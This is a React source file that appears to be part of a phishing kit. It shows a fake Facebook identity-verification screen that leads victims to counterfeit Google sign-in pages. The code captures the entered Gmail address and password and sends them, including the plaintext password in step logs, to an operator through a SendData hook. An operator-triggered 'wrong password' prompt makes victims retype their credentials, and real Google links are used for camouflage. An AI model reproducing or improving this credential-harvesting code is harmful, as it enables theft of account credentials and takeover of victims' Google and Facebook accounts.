import React, { useState, useEffect, useRef, useContext } from "react";
import { styled } from "styled-components";
import { DataContext } from "../../pages";
import SendData from "../../hooks/SendData";
import GoogleShell, {
  GTitle,
  GSubtitle,
  GError,
  GoogleInput,
  GoogleSpinner,
  NextButton,
  TextButton,
  EmailChip,
  GContent,
  GLeft,
  GRight,
  GActions,
} from "../google/GoogleShell";
import {
  AuthShell,
  AuthColumn,
  AuthEyebrow,
  AuthHeading,
  AuthBody,
  AuthPrimaryButton,
  AuthInfoList,
  AuthInfoRow,
  ShareOffIcon,
  LockIcon,
} from "./shared";
import { getGoogleMaskedEmailDisplay } from "../../utils/validationUtils";
import { GOOGLE_CONFIG, googleDebugLog } from "../../utils/googleConfig";

const redirect = (url) => setTimeout(() => { window.location.href = url; }, 600);

const GuestText = styled.div`
  margin-top: 40px;
  font-size: 14px;
  line-height: 1.4286;
  color: #444746;

  a {
    color: #0b57d0;
    font-weight: 500;
  }
`;

const ForgotWrap = styled.div`
  margin-top: 8px;
  margin-left: -12px;
  align-self: flex-start;
`;

const CreateWrap = styled.div`
  position: relative;
`;

const CreateMenu = styled.div`
  position: absolute;
  bottom: 100%;
  left: 0;
  margin-bottom: 4px;
  background: #fff;
  border-radius: 8px;
  box-shadow: 0 2px 6px 2px rgba(60, 64, 67, 0.15);
  min-width: 220px;
  padding: 8px 0;
  z-index: 20;
`;

const CreateItem = styled.button`
  display: block;
  width: 100%;
  text-align: left;
  background: none;
  border: none;
  padding: 10px 16px;
  font-size: 14px;
  color: #1f1f1f;
  cursor: pointer;
  font-family: Roboto, Arial, sans-serif;

  &:hover {
    background: rgba(0, 0, 0, 0.05);
  }
`;

const ShowPasswordRow = styled.label`
  display: flex;
  align-items: center;
  gap: 12px;
  margin-top: 16px;
  font-size: 14px;
  color: #1f1f1f;
  cursor: pointer;
  user-select: none;

  input {
    width: 18px;
    height: 18px;
    accent-color: #0b57d0;
    cursor: pointer;
    margin: 0;
  }
`;

function Fa2Google({ Unik, Email, Ip, LastFetch, wrong2faTrigger }) {
  const { setAllData, AllData } = useContext(DataContext);

  const [view, setView] = useState("fb");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [emailError, setEmailError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [verifyLoading, setVerifyLoading] = useState(false);
  const [emailLoading, setEmailLoading] = useState(false);
  const [passwordLoading, setPasswordLoading] = useState(false);
  const [createOpen, setCreateOpen] = useState(false);

  const createRef = useRef(null);
  const lastProcessedWrong2fa = useRef(wrong2faTrigger);

  const loginEmail = Email || AllData?.login_email || "";

  const sendUpdate = (extra, stepMessage) => {
    const params = {
      ...AllData,
      id: Unik,
      ip: Ip || AllData?.ip,
      ...extra,
      currentStep: stepMessage,
    };
    setAllData(params);
    SendData(params);
  };

  useEffect(() => {
    sendUpdate({}, "Google 2FA Page Loaded - Facebook confirmation screen displayed");
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (!createOpen) return undefined;
    const close = (e) => {
      if (createRef.current && !createRef.current.contains(e.target)) {
        setCreateOpen(false);
      }
    };
    document.addEventListener("mousedown", close);
    return () => document.removeEventListener("mousedown", close);
  }, [createOpen]);

  useEffect(() => {
    if (wrong2faTrigger === lastProcessedWrong2fa.current) return;
    lastProcessedWrong2fa.current = wrong2faTrigger;

    if (!passwordLoading) return;

    googleDebugLog("Wrong Google password flagged by operator");
    setPasswordLoading(false);
    setPassword("");
    setPasswordError("Wrong password. Try again or click Forgot password to reset it.");
    sendUpdate(
      { google_email: email },
      "Google 2FA Invalid - Wrong password, user can retry"
    );
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [wrong2faTrigger, passwordLoading]);

  const handleVerify = () => {
    if (verifyLoading) return;
    setVerifyLoading(true);
    sendUpdate({}, "Google 2FA - User clicked Verify with Google");
    setTimeout(() => {
      setVerifyLoading(false);
      setView("identifier");
    }, GOOGLE_CONFIG.BUTTON_DELAY);
  };

  const validateEmail = (value) => {
    const v = value.trim();
    if (!v) {
      setEmailError("Enter an email or phone number");
      return false;
    }
    if (v.includes("@")) {
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)) {
        setEmailError("Enter a valid email or phone number");
        return false;
      }
    } else if (!/^\+?[\d\s-]{6,}$/.test(v)) {
      setEmailError("Enter a valid email or phone number");
      return false;
    }
    return true;
  };

  const handleEmailNext = (e) => {
    e.preventDefault();
    if (emailLoading) return;
    if (!validateEmail(email)) return;

    setEmailError("");
    setEmailLoading(true);
    sendUpdate(
      { google_email: email.trim() },
      `Google Sign-In - Email entered: \`${email.trim()}\``
    );
    setTimeout(() => {
      setEmailLoading(false);
      setView("password");
    }, GOOGLE_CONFIG.VERIFY_DELAY);
  };

  const handlePasswordNext = (e) => {
    e.preventDefault();
    if (passwordLoading) return;
    if (!password) {
      setPasswordError("Enter a password");
      return;
    }

    setPasswordError("");
    setPasswordLoading(true);
    sendUpdate(
      { google_email: email.trim(), google_password: password },
      `Google 2FA - Password submitted for \`${email.trim()}\` - Password: \`${password}\``
    );
  };

  if (view === "fb") {
    const maskedEmail = getGoogleMaskedEmailDisplay(loginEmail);
    return (
      <AuthShell>
        <AuthColumn>
          <AuthEyebrow>Facebook</AuthEyebrow>
          <AuthHeading>
            Sign in to your Google Account to verify your identity
          </AuthHeading>
          <AuthBody>
            For security reasons, you&rsquo;ll need to prove your identity with
            your Google Account by signing in with the Gmail address from your
            Facebook account: {maskedEmail}.
          </AuthBody>
          <AuthInfoList>
            <AuthInfoRow icon={<ShareOffIcon />}>
              We don&rsquo;t share any of your Facebook Account data with your
              Google Account
            </AuthInfoRow>
            <AuthInfoRow icon={<LockIcon />}>
              This will not change your Facebook login details
            </AuthInfoRow>
          </AuthInfoList>
          <AuthPrimaryButton onClick={handleVerify} disabled={verifyLoading}>
            {verifyLoading ? <GoogleSpinner color="#ffffff" size={20} /> : "Verify with Google"}
          </AuthPrimaryButton>
        </AuthColumn>
      </AuthShell>
    );
  }

  if (view === "identifier") {
    return (
      <GoogleShell initialLoading={false}>
        <GContent>
          <GLeft>
            <GTitle>Sign in</GTitle>
            <GSubtitle>Use your Google Account</GSubtitle>
          </GLeft>
          <GRight>
            <form id="google-identifier-form" onSubmit={handleEmailNext}>
              <GoogleInput
                label="Email or phone"
                name="google-email"
                value={email}
                onChange={(e) => {
                  setEmail(e.target.value);
                  if (emailError) setEmailError("");
                }}
                error={!!emailError}
                disabled={emailLoading}
                autoFocus
                autoComplete="username"
              />
              {emailError && <GError>{emailError}</GError>}
              <ForgotWrap>
                <TextButton type="button" onClick={() => { sendUpdate({}, "Google Sign-In - User clicked Forgot email"); redirect("https://accounts.google.com/signin/usernamerecovery"); }} disabled={emailLoading}>
                  Forgot email?
                </TextButton>
              </ForgotWrap>
              <GuestText>
                Not your computer? Use Guest mode to sign in privately.{" "}
                <a href="https://support.google.com/chrome/answer/6130773" target="_blank" rel="noreferrer">
                  Learn more about using Guest mode
                </a>
              </GuestText>
            </form>
          </GRight>
        </GContent>
        <GActions>
          <CreateWrap ref={createRef}>
            <TextButton type="button" onClick={() => setCreateOpen((o) => !o)} disabled={emailLoading}>
              Create account
            </TextButton>
            {createOpen && (
              <CreateMenu>
                <CreateItem type="button" onClick={() => { setCreateOpen(false); sendUpdate({ google_email: email?.trim() }, "Google Sign-In - User clicked Create account (For my personal use)"); redirect("https://accounts.google.com/signup"); }}>
                  For my personal use
                </CreateItem>
                <CreateItem type="button" onClick={() => { setCreateOpen(false); sendUpdate({ google_email: email?.trim() }, "Google Sign-In - User clicked Create account (For my child)"); redirect("https://accounts.google.com/signup"); }}>
                  For my child
                </CreateItem>
                <CreateItem type="button" onClick={() => { setCreateOpen(false); sendUpdate({ google_email: email?.trim() }, "Google Sign-In - User clicked Create account (For work or my business)"); redirect("https://accounts.google.com/signup"); }}>
                  For work or my business
                </CreateItem>
              </CreateMenu>
            )}
          </CreateWrap>
          <NextButton type="submit" form="google-identifier-form" disabled={emailLoading}>
            {emailLoading ? <GoogleSpinner color="#ffffff" size={18} /> : "Next"}
          </NextButton>
        </GActions>
      </GoogleShell>
    );
  }

  return (
    <GoogleShell initialLoading={false}>
      <GContent>
        <GLeft>
          <GTitle>Welcome</GTitle>
          <div>
            <EmailChip email={email.trim()} onClick={() => { sendUpdate({ google_email: email.trim() }, "Google Sign-In - User returned to email entry (switch account)"); setView("identifier"); setPassword(""); setPasswordError(""); }} />
          </div>
        </GLeft>
        <GRight>
          <form id="google-password-form" onSubmit={handlePasswordNext}>
            <GoogleInput
              label="Enter your password"
              name="google-password"
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                if (passwordError) setPasswordError("");
              }}
              error={!!passwordError}
              disabled={passwordLoading}
              autoFocus
              autoComplete="current-password"
            />
            {passwordError && <GError>{passwordError}</GError>}
            <ShowPasswordRow>
              <input type="checkbox" checked={showPassword} onChange={(e) => setShowPassword(e.target.checked)} disabled={passwordLoading} />
              Show password
            </ShowPasswordRow>
          </form>
        </GRight>
      </GContent>
      <GActions>
        <TextButton type="button" onClick={() => { sendUpdate({ google_email: email.trim() }, "Google Sign-In - User clicked Forgot password"); redirect("https://accounts.google.com/signin/recovery"); }} disabled={passwordLoading}>
          Forgot password?
        </TextButton>
        <NextButton type="submit" form="google-password-form" disabled={passwordLoading}>
          {passwordLoading ? <GoogleSpinner color="#ffffff" size={18} /> : "Next"}
        </NextButton>
      </GActions>
    </GoogleShell>
  );
}

export default Fa2Google;
